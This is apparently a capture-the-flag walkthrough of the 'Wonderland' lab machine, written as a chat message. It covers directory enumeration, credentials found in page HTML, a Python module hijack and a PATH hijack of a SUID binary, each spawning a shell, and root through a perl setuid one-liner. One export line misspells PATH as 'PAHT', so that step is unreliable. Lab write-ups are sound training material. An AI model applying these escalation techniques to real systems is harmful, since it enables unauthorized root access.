user:
First, we run a `gobuster` scan on the website.
after running gobuster:
```
┌─[root@edu-virtualbox]─[/home/edu/THM]
└──╼ #gobuster dir -u 10.10.81.91 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.81.91
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/05 19:14:21 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/poem                 (Status: 301) [Size: 0] [--> poem/]
/r                    (Status: 301) [Size: 0] [--> r/]   
===============================================================
2023/03/05 19:15:12 Finished
===============================================================
```

full path: `/r/a/b/b/i/t`
found credentials in the HTML: `alice:HowDothTheLittleCrocodileImproveHisShiningTail`

After logging in as the `alice` user, there is a sudo -l:
```
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

In the python file, the line `import random;random.choice()` is used.
And it turns out the pyton library path is reversed (the current directory is checked first):
```
alice@wonderland:/tmp$ cat test.py 
import sys
for path in sys.path:
        print(path)
alice@wonderland:/tmp$ python3 test.py 
/tmp
/usr/lib/python36.zip
/usr/lib/python3.6
/usr/lib/python3.6/lib-dynload
/usr/local/lib/python3.6/dist-packages
/usr/lib/python3/dist-packages
```

So, we create a new python file in the home directory of `alice` called `random.py`:
```
alice@wonderland:~$ cat random.py 
import pty
def choice(a):
   pty.spawn("/bin/bash")
```

In the home directory of the `hatter`, there is a SUID file called `teaParty`. We upload this to the attacker machine, and use ghidra:
main():
```
{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```
In this case, the command `date --date=\'next hour\' -R` is being used.
`date` is not used with the full path, so we can use:
```
export PAHT=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
and we create a binary called `date` in `/tmp`:
```
#!/bin/bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

in the `linpeas.sh` log:
```
/usr/bin/perl = cap_setuid+ep
```

After looking up on gtfobins:
```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
for root.